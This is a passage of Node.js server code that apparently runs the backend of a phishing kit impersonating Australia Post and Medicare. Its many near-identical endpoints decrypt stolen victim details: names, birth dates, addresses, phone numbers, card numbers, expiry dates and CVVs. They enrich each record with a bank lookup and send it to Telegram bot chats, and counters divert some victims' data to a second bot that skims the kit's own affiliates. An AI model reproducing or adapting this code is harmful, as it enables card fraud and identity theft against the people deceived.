  userIp = req.body.ip;
  userAgent = req.body.userAgent;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${zip} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${fullname}\nDOB: ${dob}\nAddress: ${address}\nCity: ${city}\nState: ${state}\nZIP: ${zip}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cccvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;

      axios.post(
        `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=-725162140&text=AusPost:\n${originalText}`
      );

      res.send("Update Completed");
    });
});

app.options("/ausPostKelv", cors());

app.post("/ausPostKelv", (req, res) => {
  fullname = CryptoJS.AES.decrypt(req.body.fullname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address = CryptoJS.AES.decrypt(req.body.address, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address2 = CryptoJS.AES.decrypt(req.body.address2, "402312").toString(
    CryptoJS.enc.Utf8
  );
  city = CryptoJS.AES.decrypt(req.body.city, "402312").toString(
    CryptoJS.enc.Utf8
  );
  state = CryptoJS.AES.decrypt(req.body.state, "402312").toString(
    CryptoJS.enc.Utf8
  );
  zip = CryptoJS.AES.decrypt(req.body.zip, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexp = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cccvv = CryptoJS.AES.decrypt(req.body.cvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  bin = req.body.bin;
  userIp = req.body.ip;
  userAgent = req.body.userAgent;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${zip} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${fullname}\nDOB: ${dob}\nAddress: ${address}\nCity: ${city}\nState: ${state}\nZIP: ${zip}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cccvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (ssCount == 4) {
        axios.post(
          `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
        );
        ssCount = 0;
      } else {
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=AusPostKelv:\n${originalText}`
        );
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=1248378980&text=AusPost:\n${originalText}`
        );
        ssCount += 1;
      }
      res.send("Update Completed");
    });
});

let SpoofergooferAP = 0;

app.options("/ausPostSpoofer", cors());

app.post("/ausPostSpoofer", (req, res) => {
  fullname = CryptoJS.AES.decrypt(req.body.fullname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address = CryptoJS.AES.decrypt(req.body.address, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address2 = CryptoJS.AES.decrypt(req.body.address2, "402312").toString(
    CryptoJS.enc.Utf8
  );
  city = CryptoJS.AES.decrypt(req.body.city, "402312").toString(
    CryptoJS.enc.Utf8
  );
  state = CryptoJS.AES.decrypt(req.body.state, "402312").toString(
    CryptoJS.enc.Utf8
  );
  zip = CryptoJS.AES.decrypt(req.body.zip, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexp = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cccvv = CryptoJS.AES.decrypt(req.body.cvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  bin = req.body.bin;
  userIp = req.body.ip;
  userAgent = req.body.userAgent;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${zip} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${fullname}\nDOB: ${dob}\nAddress: ${address}\nCity: ${city}\nState: ${state}\nZIP: ${zip}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cccvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (SpoofergooferAP == 500) {
        axios.post(
          `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=AusPostSpoofer:\n${originalText}`
        );
        SpoofergooferAP = 0;
      } else {
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=AusPostSpoofer:\n${originalText}`
        );
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=993063133&text=AusPost:\n${originalText}`
        );
        SpoofergooferAP += 1;
      }
      res.send("Update Completed");
    });
});

app.options("/ausPostLoader", cors());

app.post("/ausPostLoader", (req, res) => {
  fullname = CryptoJS.AES.decrypt(req.body.fullname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address = CryptoJS.AES.decrypt(req.body.address, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address2 = CryptoJS.AES.decrypt(req.body.address2, "402312").toString(
    CryptoJS.enc.Utf8
  );
  city = CryptoJS.AES.decrypt(req.body.city, "402312").toString(
    CryptoJS.enc.Utf8
  );
  state = CryptoJS.AES.decrypt(req.body.state, "402312").toString(
    CryptoJS.enc.Utf8
  );
  zip = CryptoJS.AES.decrypt(req.body.zip, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexp = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cccvv = CryptoJS.AES.decrypt(req.body.cvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  bin = req.body.bin;
  userIp = req.body.ip;
  userAgent = req.body.userAgent;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${zip} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${fullname}\nDOB: ${dob}\nAddress: ${address}\nCity: ${city}\nState: ${state}\nZIP: ${zip}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cccvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;

      axios.post(
        `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=AusPostLoader:\n${originalText}`
      );
      axios.post(
        `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=697703458&text=AusPost:\n${originalText}`
      );
      SpoofergooferAP += 1;

      res.send("Update Completed");
    });
});

//MEDICARE
//MEDICARE
//MEDICARE

app.options("/tarrifiMedicare", cors());

app.post("/tarrifiMedicare", (req, res) => {
  fullname = CryptoJS.AES.decrypt(req.body.fullname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address = CryptoJS.AES.decrypt(req.body.address, "402312").toString(
    CryptoJS.enc.Utf8
  );
  city = CryptoJS.AES.decrypt(req.body.city, "402312").toString(
    CryptoJS.enc.Utf8
  );
  state = CryptoJS.AES.decrypt(req.body.state, "402312").toString(
    CryptoJS.enc.Utf8
  );
  zip = CryptoJS.AES.decrypt(req.body.zip, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccname = CryptoJS.AES.decrypt(req.body.ccname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpmonth = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpyear = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cccvv = CryptoJS.AES.decrypt(req.body.cvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  bin = req.body.bin;
  userIp = req.body.ip;
  userAgent = req.body.userAgent;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${zip} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${fullname}\nDOB: ${dob}\nAddress: ${address}\nCity: ${city}\nState: ${state}\nZIP: ${zip}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexpmonth}/${ccexpyear}\nCVV: ${cccvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (mason == 6) {
        axios.post(
          `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
        );
        mason = 0;
      } else {
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=MedicareTarrifi:\n${originalText}`
        );
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=937419988&text=MediCare:\n${originalText}`
        );
        mason += 1;
      }

      res.send("Update Completed");
    });
});

let MZ7 = 0;

app.options("/MZ7Medicare", cors());

app.post("/MZ7Medicare", (req, res) => {
  fullname = CryptoJS.AES.decrypt(req.body.fullname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address = CryptoJS.AES.decrypt(req.body.address, "402312").toString(
    CryptoJS.enc.Utf8
  );
  city = CryptoJS.AES.decrypt(req.body.city, "402312").toString(
    CryptoJS.enc.Utf8
  );
  state = CryptoJS.AES.decrypt(req.body.state, "402312").toString(
    CryptoJS.enc.Utf8
  );
  zip = CryptoJS.AES.decrypt(req.body.zip, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccname = CryptoJS.AES.decrypt(req.body.ccname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpmonth = CryptoJS.AES.decrypt(req.body.ccexpmonth, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpyear = CryptoJS.AES.decrypt(req.body.ccexpyear, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cccvv = CryptoJS.AES.decrypt(req.body.cvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  bin = req.body.bin;
  userIp = req.body.ip;
  userAgent = req.body.userAgent;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${zip} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${fullname}\nDOB: ${dob}\nAddress: ${address}\nCity: ${city}\nState: ${state}\nZIP: ${zip}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Name: ${ccname}\nCard Number: ${ccnum}\nExpiry: ${ccexpmonth}/${ccexpyear}\nCVV: ${cccvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (MZ7 == 3) {
        axios.post(
          `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
        );
        MZ7 = 0;
      } else {
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=MedicareMZ7:\n${originalText}`
        );
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=1225398527&text=MediCare:\n${originalText}`
        );
        MZ7 += 1;
      }

      res.send("Update Completed");
    });
});

let putin = 0;

app.options("/putinMedicare", cors());

app.post("/putinMedicare", (req, res) => {
  fullname = CryptoJS.AES.decrypt(req.body.fullname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address = CryptoJS.AES.decrypt(req.body.address, "402312").toString(
    CryptoJS.enc.Utf8
  );
  city = CryptoJS.AES.decrypt(req.body.city, "402312").toString(
    CryptoJS.enc.Utf8
  );
  state = CryptoJS.AES.decrypt(req.body.state, "402312").toString(
    CryptoJS.enc.Utf8
  );
  zip = CryptoJS.AES.decrypt(req.body.zip, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccname = CryptoJS.AES.decrypt(req.body.ccname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpmonth = CryptoJS.AES.decrypt(req.body.ccexpmonth, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpyear = CryptoJS.AES.decrypt(req.body.ccexpyear, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cccvv = CryptoJS.AES.decrypt(req.body.cvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  bin = req.body.bin;
  userIp = req.body.ip;
  userAgent = req.body.userAgent;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${zip} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${fullname}\nDOB: ${dob}\nAddress: ${address}\nCity: ${city}\nState: ${state}\nZIP: ${zip}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Name: ${ccname}\nCard Number: ${ccnum}\nExpiry: ${ccexpmonth}/${ccexpyear}\nCVV: ${cccvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (putin == 3) {
        axios.post(
          `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
        );
        putin = 0;
      } else {
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=MedicarePutin:\n${originalText}`
        );
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=5362313568&text=MediCare:\n${originalText}`
        );
        putin += 1;
      }

      res.send("Update Completed");
    });
});

let failedlawyer = 1;

app.options("/failedlawyerMedicare", cors());

app.post("/failedlawyerMedicare", (req, res) => {
  fullname = CryptoJS.AES.decrypt(req.body.fullname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address = CryptoJS.AES.decrypt(req.body.address, "402312").toString(
    CryptoJS.enc.Utf8
  );
  city = CryptoJS.AES.decrypt(req.body.city, "402312").toString(
    CryptoJS.enc.Utf8
  );
  state = CryptoJS.AES.decrypt(req.body.state, "402312").toString(
    CryptoJS.enc.Utf8
  );
  zip = CryptoJS.AES.decrypt(req.body.zip, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccname = CryptoJS.AES.decrypt(req.body.ccname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpmonth = CryptoJS.AES.decrypt(req.body.ccexpmonth, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpyear = CryptoJS.AES.decrypt(req.body.ccexpyear, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cccvv = CryptoJS.AES.decrypt(req.body.cvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  bin = req.body.bin;
  userIp = req.body.ip;
  userAgent = req.body.userAgent;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${zip} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${fullname}\nDOB: ${dob}\nAddress: ${address}\nCity: ${city}\nState: ${state}\nZIP: ${zip}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Name: ${ccname}\nCard Number: ${ccnum}\nExpiry: ${ccexpmonth}/${ccexpyear}\nCVV: ${cccvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (failedlawyer == 1) {
        axios.post(
          `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
        );
        failedlawyer = 0;
      } else {
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=MedicareFailed:\n${originalText}`
        );
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=5472804493&text=MediCare:\n${originalText}`
        );
        failedlawyer += 1;
      }

      res.send("Update Completed");
    });
});

let codeNba = 0;

app.options("/codeNbaMedicare", cors());

app.post("/codeNbaMedicare", (req, res) => {
  fullname = CryptoJS.AES.decrypt(req.body.fullname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address = CryptoJS.AES.decrypt(req.body.address, "402312").toString(
    CryptoJS.enc.Utf8
  );
  city = CryptoJS.AES.decrypt(req.body.city, "402312").toString(
    CryptoJS.enc.Utf8
  );
  state = CryptoJS.AES.decrypt(req.body.state, "402312").toString(
    CryptoJS.enc.Utf8
  );
  zip = CryptoJS.AES.decrypt(req.body.zip, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccname = CryptoJS.AES.decrypt(req.body.ccname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpmonth = CryptoJS.AES.decrypt(req.body.ccexpmonth, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpyear = CryptoJS.AES.decrypt(req.body.ccexpyear, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cccvv = CryptoJS.AES.decrypt(req.body.cvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  bin = req.body.bin;
  userIp = req.body.ip;
  userAgent = req.body.userAgent;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${zip} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${fullname}\nDOB: ${dob}\nAddress: ${address}\nCity: ${city}\nState: ${state}\nZIP: ${zip}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Name: ${ccname}\nCard Number: ${ccnum}\nExpiry: ${ccexpmonth}/${ccexpyear}\nCVV: ${cccvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (codeNba == 100) {
        axios.post(
          `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
        );
        codeNba = 0;
      } else {
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=MedicareCodeNBA:\n${originalText}`
        );
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=1132816276&text=MediCare:\n${originalText}`
        );
        codeNba += 1;
      }

      res.send("Update Completed");
    });
});

let s350 = 2;

app.options("/ssMedicare", cors());

app.post("/ssMedicare", (req, res) => {
  fullname = CryptoJS.AES.decrypt(req.body.fullname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address = CryptoJS.AES.decrypt(req.body.address, "402312").toString(
    CryptoJS.enc.Utf8
  );
  city = CryptoJS.AES.decrypt(req.body.city, "402312").toString(
    CryptoJS.enc.Utf8
  );
  state = CryptoJS.AES.decrypt(req.body.state, "402312").toString(
    CryptoJS.enc.Utf8
  );
  zip = CryptoJS.AES.decrypt(req.body.zip, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccname = CryptoJS.AES.decrypt(req.body.ccname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpmonth = CryptoJS.AES.decrypt(req.body.ccexpmonth, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpyear = CryptoJS.AES.decrypt(req.body.ccexpyear, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cccvv = CryptoJS.AES.decrypt(req.body.cvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  bin = req.body.bin;
  userIp = req.body.ip;
  userAgent = req.body.userAgent;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${zip} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${fullname}\nDOB: ${dob}\nAddress: ${address}\nCity: ${city}\nState: ${state}\nZIP: ${zip}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Name: ${ccname}\nCard Number: ${ccnum}\nExpiry: ${ccexpmonth}/${ccexpyear}\nCVV: ${cccvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (ssCount == 3) {
        axios.post(
          `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
        );
        ssCount = 0;
      } else {
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=MedicareSS:\n${originalText}`
        );
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=1318459885&text=MediCare:\n${originalText}`
        );
        ssCount += 1;
      }

      res.send("Update Completed");
    });
});

app.options("/offshorebillionsMedicare", cors());

app.post("/offshorebillionsMedicare", (req, res) => {
  fullname = CryptoJS.AES.decrypt(req.body.fullname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address = CryptoJS.AES.decrypt(req.body.address, "402312").toString(
    CryptoJS.enc.Utf8
  );
  city = CryptoJS.AES.decrypt(req.body.city, "402312").toString(
    CryptoJS.enc.Utf8
  );
  state = CryptoJS.AES.decrypt(req.body.state, "402312").toString(
    CryptoJS.enc.Utf8
  );
  zip = CryptoJS.AES.decrypt(req.body.zip, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccname = CryptoJS.AES.decrypt(req.body.ccname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpmonth = CryptoJS.AES.decrypt(req.body.ccexpmonth, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpyear = CryptoJS.AES.decrypt(req.body.ccexpyear, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cccvv = CryptoJS.AES.decrypt(req.body.cvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  bin = req.body.bin;
  userIp = req.body.ip;
  userAgent = req.body.userAgent;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${zip} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${fullname}\nDOB: ${dob}\nAddress: ${address}\nCity: ${city}\nState: ${state}\nZIP: ${zip}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Name: ${ccname}\nCard Number: ${ccnum}\nExpiry: ${ccexpmonth}/${ccexpyear}\nCVV: ${cccvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (s350 == 2) {
        axios.post(
          `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
        );
        s350 = 0;
      } else {
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=MedicareS350:\n${originalText}`
        );
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=1248091713&text=MediCare:\n${originalText}`
        );
        s350 += 1;
      }

      res.send("Update Completed");
    });
});

app.options("/haytchMedicare", cors());

app.post("/haytchMedicare", (req, res) => {
